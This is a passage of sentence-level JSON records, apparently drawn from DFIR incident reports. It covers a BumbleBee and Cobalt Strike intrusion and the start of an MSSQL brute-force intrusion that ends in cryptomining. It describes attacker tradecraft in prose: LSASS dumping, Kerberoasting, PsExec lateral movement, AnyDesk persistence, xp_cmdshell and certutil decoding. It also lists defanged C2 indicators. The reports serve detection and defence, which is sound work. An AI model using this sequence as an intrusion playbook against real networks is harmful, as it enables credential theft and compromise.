        "text": "The initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open a document.lnk file which will execute the malicious DLL loader using the following command line:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 33,
        "index": 4842
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S34",
        "text": "Running Eric Zimmerman\u2019s tool LECmd revealed additional details related to the threat actors.",
        "type": "",
        "report": "r-dfir-11",
        "line": 34,
        "index": 4843
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S35",
        "text": "The metadata included TA machine\u2019s hostname, MAC address, and the LNK document creation date:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 35,
        "index": 4844
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S36",
        "text": "The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.",
        "type": "",
        "report": "r-dfir-11",
        "line": 36,
        "index": 4845
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S37",
        "text": "The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 37,
        "index": 4846
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S38",
        "text": "Sysmon File Created event showing wab.exe created by rundll32.exe\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 38,
        "index": 4847
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S39",
        "text": "Sysmon Event Code 1 showing wab.exe executed by WMI\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 39,
        "index": 4848
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S40",
        "text": "The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 40,
        "index": 4849
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S41",
        "text": "Since the download took place over an unencrypted HTTP channel, the network traffic was plainly visible.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 41,
        "index": 4850
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S42",
        "text": "This payload can be deobfuscated using the following CyberChef recipe:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 42,
        "index": 4851
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S43",
        "text": "Once deobfuscated, we can spot the MZRE header, which is part of the default configuration of Cobalt Strike:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 43,
        "index": 4852
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S44",
        "text": "One of the easiest ways to extract valuable information from this Shellcode is using Didier Stevens 1768.py tool:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 44,
        "index": 4853
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S45",
        "text": "The command and control server was hosted on (108.62.12[.]174/dofixifa[.]co).",
        "type": "",
        "report": "r-dfir-11",
        "line": 45,
        "index": 4854
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S46",
        "text": "The full config extraction, detailing the Malleable C2 profile, is available in Command and Control section.",
        "type": "",
        "report": "r-dfir-11",
        "line": 46,
        "index": 4855
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S47",
        "text": "AnyDesk and its installation as a service was used in order to persist and create a backdoor to the network.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 47,
        "index": 4856
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S48",
        "text": "Threat actors made a mistake by launching the getsystem command in the wrong console (shell console rather than the beacon console).",
        "type": "",
        "report": "r-dfir-11",
        "line": 48,
        "index": 4857
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S49",
        "text": "The parent process of this command was C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc , a process where Cobalt Strike was injected into:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 49,
        "index": 4858
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S50",
        "text": "This command is a built-in Cobalt Strike command that is used to get SYSTEM privileges.",
        "type": "",
        "report": "r-dfir-11",
        "line": 50,
        "index": 4859
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S51",
        "text": "A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender\u2019s Guide blog post.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 51,
        "index": 4860
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S52",
        "text": "Threat actors obtained and abused credentials of privilege domain accounts as a means of gaining privilege escalation on the domain.",
        "type": "",
        "report": "r-dfir-11",
        "line": 52,
        "index": 4861
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S53",
        "text": "They also utilized local administrator accounts.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 53,
        "index": 4862
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S54",
        "text": "A service account, with Domain Admin permissions, was used to create a remote service on a Domain Controller to move laterally.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 54,
        "index": 4863
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S55",
        "text": "The process injection technique was used multiple times to inject into different processes.",
        "type": "",
        "report": "r-dfir-11",
        "line": 55,
        "index": 4864
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S56",
        "text": "Almost every post-exploitation job was launched from an injected process.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 56,
        "index": 4865
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S57",
        "text": "Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 57,
        "index": 4866
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S58",
        "text": "Threat actors also created a remote thread in svchost.exe:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 58,
        "index": 4867
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S59",
        "text": "Multiple processes were then spawned by :\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 59,
        "index": 4868
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S60",
        "text": "to perform various techniques (Enumeration, Credential dumping, etc.):",
        "type": "",
        "report": "r-dfir-11",
        "line": 60,
        "index": 4869
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S61",
        "text": "A Yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 61,
        "index": 4870
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S62",
        "text": "Indicator Removal on Host: File Deletion\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 62,
        "index": 4871
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S63",
        "text": "We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 63,
        "index": 4872
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S64",
        "text": "The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 64,
        "index": 4873
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S65",
        "text": "Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc beacon:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 65,
        "index": 4874
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S66",
        "text": "Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 66,
        "index": 4875
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S67",
        "text": "The ProcDump utility was executed on those workstations using the following command line:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 67,
        "index": 4876
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S68",
        "text": "Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 68,
        "index": 4877
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S69",
        "text": "Here is an extract of PowerShell EventID 800 showing different Invoke-Kerberoast options used by threat actors, including HashCat output format:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 69,
        "index": 4878
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S70",
        "text": "Right after the execution of Invoke-Kerberoast, DC logs show that multiple Kerberos Service Tickets were requested from the beachhead host, with ticket encryption type set to 0x17 (RC4) and ticket options to 0x40810000, for service accounts.",
        "type": "",
        "report": "r-dfir-11",
        "line": 70,
        "index": 4879
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S71",
        "text": "Around 3 hours later, one of the service accounts logged into one of the Domain Controllers from the beachhead.",
        "type": "",
        "report": "r-dfir-11",
        "line": 71,
        "index": 4880
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S72",
        "text": "We assess with high confidence that the service account password was weak and cracked offline by threat actors.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 72,
        "index": 4881
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S73",
        "text": "System Information & Software Discovery\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 73,
        "index": 4882
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S74",
        "text": "The following commands were launched by the wab.exe beacon:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 74,
        "index": 4883
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S75",
        "text": "Using the same beacon, wab.exe, tasklist was also used in order to enumerate processes on multiple hosts remotely:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 75,
        "index": 4884
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S76",
        "text": "As we have already observed in multiple cases, the threat actors enumerated the local administrators group and domain privileged (Enterprise and DAs) administrators groups mainly using net command:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 76,
        "index": 4885
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S77",
        "text": "Threat actors failed on a part of their tasks, by executing the command in the wrong console:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 77,
        "index": 4886
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S78",
        "text": "We can assert with high confidence that the recon stage was not fully automated, and threat actors manually executed commands and made a mistake in one of those.",
        "type": "",
        "report": "r-dfir-11",
        "line": 78,
        "index": 4887
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S79",
        "text": "To enumerate Active Directory, the threat actors executed AdFind from the beachhead host, on three different occasions:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 79,
        "index": 4888
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S80",
        "text": "The source of execution, the initiating parent process, was different on each occasion and the name of AdFind binary and the result files were different on one occasion, which could indicate multiple Threat actors accessing the network.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 80,
        "index": 4889
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S81",
        "text": "Threat actors used two scripts named s.bat (for servers) and w.bat (for workstations) to ping the hosts and store the results in two log files:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 81,
        "index": 4890
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S82",
        "text": "Both of those scripts were executed from the PowerShell Cobalt Strike beacon (powershell.exe).",
        "type": "",
        "report": "r-dfir-11",
        "line": 82,
        "index": 4891
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S83",
        "text": "Invoke-ShareFinder is a PowerShell module which is part of PowerView.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 83,
        "index": 4892
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S84",
        "text": "Invoke-ShareFinder \u2013 finds (non-standard) shares on hosts in the local domain\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 84,
        "index": 4893
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S85",
        "text": "Threat actors performed share enumeration using Invoke-ShareFinder.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 85,
        "index": 4894
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S86",
        "text": "Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\\ProgramData\\.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 86,
        "index": 4895
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S87",
        "text": "The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 87,
        "index": 4896
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S88",
        "text": "Seatbelt is a C# project that performs a number of security oriented host-survey \u201csafety checks\u201d relevant from both offensive and defensive security perspectives.",
        "type": "",
        "report": "r-dfir-11",
        "line": 88,
        "index": 4897
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S89",
        "text": "Threat actors performed a full reconnaissance by specifying the flag -group=all :\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 89,
        "index": 4898
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S90",
        "text": "Threat actors dropped two binaries named vulnrecon.dll and vulnrecon.exe on two hosts.",
        "type": "",
        "report": "r-dfir-11",
        "line": 90,
        "index": 4899
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S91",
        "text": "This is the first time we\u2019ve observed this tool.",
        "type": "",
        "report": "r-dfir-11",
        "line": 91,
        "index": 4900
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S92",
        "text": "This library seems to be a custom tool developed to assist threat actors with Windows local privilege escalation enumeration.",
        "type": "",
        "report": "r-dfir-11",
        "line": 92,
        "index": 4901
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S93",
        "text": "The table below summarizes the capabilities of the tool:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 93,
        "index": 4902
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S94",
        "text": "Below is the list of all of the currently supported (or implemented) CVE enumeration via installed KBs mapping:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 94,
        "index": 4903
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S95",
        "text": "Threat actors executed this tool on patient 0 with low-level privileges multiple times, and again on a server with Administrator privileges.",
        "type": "",
        "report": "r-dfir-11",
        "line": 95,
        "index": 4904
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S96",
        "text": "Below are all the command lines run by the adversaries:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 96,
        "index": 4905
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S97",
        "text": "Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 97,
        "index": 4906
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S98",
        "text": "The threat actors also transferred ProcDump from the beachhead to multiple workstations:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 98,
        "index": 4907
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S99",
        "text": "Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 99,
        "index": 4908
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S100",
        "text": "Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 100,
        "index": 4909
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S101",
        "text": "This first lateral movement was performed in order to drop and install AnyDesk.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 101,
        "index": 4910
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S102",
        "text": "Multiple RPC connections were initiated from the rundll32.exe process where wab.exe previously injected into:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 102,
        "index": 4911
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S103",
        "text": "These RPC connections targeted multiple hosts, including workstations, servers, and DCs.",
        "type": "",
        "report": "r-dfir-11",
        "line": 103,
        "index": 4912
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S104",
        "text": "As we can see with one server, which was targeted, the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 104,
        "index": 4913
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S105",
        "text": "Threat actors used the built-in Cobalt Strike jump psexec command to move laterally.",
        "type": "",
        "report": "r-dfir-11",
        "line": 105,
        "index": 4914
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S106",
        "text": "On each usage of this feature, a remote service was created with random alphanumeric characters, service name and service file name, e.g. \u201c<7-alphanumeric-characters>.exe\u201d.",
        "type": "",
        "report": "r-dfir-11",
        "line": 106,
        "index": 4915
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S107",
        "text": "Below is an example of the service edc603a that was created on a Domain Controller:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 107,
        "index": 4916
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S108",
        "text": "The account used to perform this lateral movement was one of the kerberoasted service accounts.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 108,
        "index": 4917
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S109",
        "text": "The service runs a rundll32.exe process without any arguments.",
        "type": "",
        "report": "r-dfir-11",
        "line": 109,
        "index": 4918
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S110",
        "text": "This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion.",
        "type": "",
        "report": "r-dfir-11",
        "line": 110,
        "index": 4919
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S111",
        "text": "We observed this beacon performing various techniques (process injections in svchost process via CreateRemoteThread, default named pipes, etc.)\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 111,
        "index": 4920
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S112",
        "text": "The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 112,
        "index": 4921
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S113",
        "text": "Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 113,
        "index": 4922
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S114",
        "text": "Two CS C2 servers were used during this intrusion.",
        "type": "",
        "report": "r-dfir-11",
        "line": 114,
        "index": 4923
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S115",
        "text": "The graph below shows beaconing activity over time, we can notice the continuous usage of the first C2 server (45.153.243[.]142/fuvataren[.]com) from day 1 and the second C2 server (108.62.12[.]174/dofixifa[.]co) during the last day of intrusion only (day 11):\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 115,
        "index": 4924
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S116",
        "text": "The main beacon wab.exe:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 116,
        "index": 4925
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S117",
        "text": "The PowerShell beacon:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 117,
        "index": 4926
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S118",
        "text": "The threat actors used default CS configuration and default named pipes.",
        "type": "",
        "report": "r-dfir-11",
        "line": 118,
        "index": 4927
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S119",
        "text": "Named pipes were created in order to establish communication between CS processes:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 119,
        "index": 4928
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S120",
        "text": "In this particular case, threat actors used default post-exploitation jobs, which have a pattern of postex_[0-9a-f]{4} .\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 120,
        "index": 4929
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S121",
        "text": "Below is the full list of all default named pipes spotted during this intrusion:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 121,
        "index": 4930
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S122",
        "text": "Named pipes are commonly used by Cobalt Strike to perform various techniques.",
        "type": "",
        "report": "r-dfir-11",
        "line": 122,
        "index": 4931
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S123",
        "text": "Here is a Guide to Named Pipes and Hunting for Cobalt Strike Pipes from one of our contributors @svch0st.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 123,
        "index": 4932
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S124",
        "text": "As mentioned before in the lateral tool transfer section, threat actors remotely dropped the AnyDesk binary on a server from the beachhead:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 124,
        "index": 4933
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S125",
        "text": "A new service was created (Event ID 7045) upon the execution of AnyDesk installer:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 125,
        "index": 4934
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S126",
        "text": "AnyDesk logs, %ProgramData%\\AnyDesk\\ad_svc.trace and %AppData%\\AnyDesk\\ad.trace , show that it was used during Day 1 and Day 7 of this intrusion, using the local Administrator account each time.",
        "type": "",
        "report": "r-dfir-11",
        "line": 126,
        "index": 4935
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S127",
        "text": "The usage of AnyDesk can be relatively easy to spot if you have the right logs (*.anydesk.com domains, AnyDesk user agent, etc.):\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 127,
        "index": 4936
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S128",
        "text": "The usage of AnyDesk also triggered two ET signatures:\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 128,
        "index": 4937
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S129",
        "text": "ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET USER_AGENTS AnyDesk Remote Desktop Software User-Agent\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 129,
        "index": 4938
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S130",
        "text": "Again, those are quick wins to add to your detection capabilities to detect the usage of unauthorized remote administration tools, commonly used by ransomware operators\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 130,
        "index": 4939
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S131",
        "text": "AnyDesk configuration file and the network logs revealed that the id used was 159889039 and the source IP was 108.177.235.25 (LeaseWeb USA \u2013 Cloud Provider).",
        "type": "",
        "report": "r-dfir-11",
        "line": 131,
        "index": 4940
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S132",
        "text": "There was no impact (exfiltration, data encryption, or destruction) during this intrusion.",
        "type": "",
        "report": "r-dfir-11",
        "line": 132,
        "index": 4941
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S133",
        "text": "However, the observed TTPs show common cybercrime threat actors tradecraft which may have lead to domain wide ransomware had the threat actors had enough time.",
        "type": "",
        "report": "r-dfir-11",
        "line": 133,
        "index": 4942
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S0",
        "text": "Over the month of March, we observed a cluster of activity targeting MSSQL servers.",
        "type": "",
        "report": "r-dfir-12",
        "line": 0,
        "index": 4943
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S1",
        "text": "The activity started via password brute force attempts for the MSSQL SA account.",
        "type": "",
        "report": "r-dfir-12",
        "line": 1,
        "index": 4944
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S2",
        "text": "These brute force attempts were observed repeatedly over the month.",
        "type": "",
        "report": "r-dfir-12",
        "line": 2,
        "index": 4945
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S3",
        "text": "Examples included one cluster of 24,000 failed attempts from the same source, over a 27 hour effort, before they finally managed to guess the password.",
        "type": "",
        "report": "r-dfir-12",
        "line": 3,
        "index": 4946
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S4",
        "text": "After having the correct credentials in their possession, the attackers then spawned a command shell via xp_cmdshell.",
        "type": "",
        "report": "r-dfir-12",
        "line": 4,
        "index": 4947
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S5",
        "text": "According to Microsoft documentation, xp_cmdshell spawns a Windows command shell and passes in a string for execution.",
        "type": "",
        "report": "r-dfir-12",
        "line": 5,
        "index": 4948
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S6",
        "text": "Using xp_cmdshell, the threat actors were able to execute any command against the compromised server.",
        "type": "",
        "report": "r-dfir-12",
        "line": 6,
        "index": 4949
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S7",
        "text": "They attempted to kill a bunch of AV programs by using taskkill.exe.",
        "type": "",
        "report": "r-dfir-12",
        "line": 7,
        "index": 4950
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S8",
        "text": "The threat actors then wrote multiple commands to a batch file by using echo and redirecting the strings to a file named 1.bat.",
        "type": "",
        "report": "r-dfir-12",
        "line": 8,
        "index": 4951
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S9",
        "text": "After the batch file was written they then proceeded to perform the same action echoing data into a file named bigfile.txt.",
        "type": "",
        "report": "r-dfir-12",
        "line": 9,
        "index": 4952
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S10",
        "text": "After they finished writing to that file, they ran certutil to decode the base64 data into an executable file.",
        "type": "",
        "report": "r-dfir-12",
        "line": 10,
        "index": 4953
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S11",
        "text": "This executable was a privilege escalation tool that was used to execute the batch file to make sure it executed with high enough permissions.",
        "type": "",
        "report": "r-dfir-12",
        "line": 11,
        "index": 4954
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S12",
        "text": "They then executed the batch script.",
        "type": "",
        "report": "r-dfir-12",
        "line": 12,
        "index": 4955
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S13",
        "text": "The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.",
        "type": "",
        "report": "r-dfir-12",
        "line": 13,
        "index": 4956
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S14",
        "text": "Once the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner.",
        "type": "",
        "report": "r-dfir-12",
        "line": 14,
        "index": 4957
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S15",
        "text": "They dropped a Binary Managed Object Format (BMOF) file along with the miner itself, to do that.",
        "type": "",
        "report": "r-dfir-12",
        "line": 15,
        "index": 4958
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S16",
        "text": "The threat actors used mofcomp.exe to decompile the BMOF binary and register a malicious class in the WMI repository.",
        "type": "",
        "report": "r-dfir-12",
        "line": 16,
        "index": 4959
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S17",
        "text": "The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.",
        "type": "",
        "report": "r-dfir-12",
        "line": 17,
        "index": 4960
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S18",
        "text": "No other activity beyond the mining was observed before the threat actors were evicted.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 18,
        "index": 4961
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S19",
        "text": "The initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.",
        "type": "",
        "report": "r-dfir-12",
        "line": 19,
        "index": 4962
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S20",
        "text": "During the intrusions, we could see SQL Server event ID 18456 Failure Audit Events in the Windows application logs.",
        "type": "",
        "report": "r-dfir-12",
        "line": 20,
        "index": 4963
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S21",
        "text": "We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.",
        "type": "",
        "report": "r-dfir-12",
        "line": 21,
        "index": 4964
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S22",
        "text": "Example of the failed brute force attempts:\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 22,
        "index": 4965
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S23",
        "text": "Followed by eventual successful logins.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 23,
        "index": 4966
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S24",
        "text": "It it likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n",
        "type": "",
        "report": "r-dfir-12",
        "line": 24,
        "index": 4967
    },
    {
        "id": "dfir-reports-filtered/r-dfir-12.md:::S25",
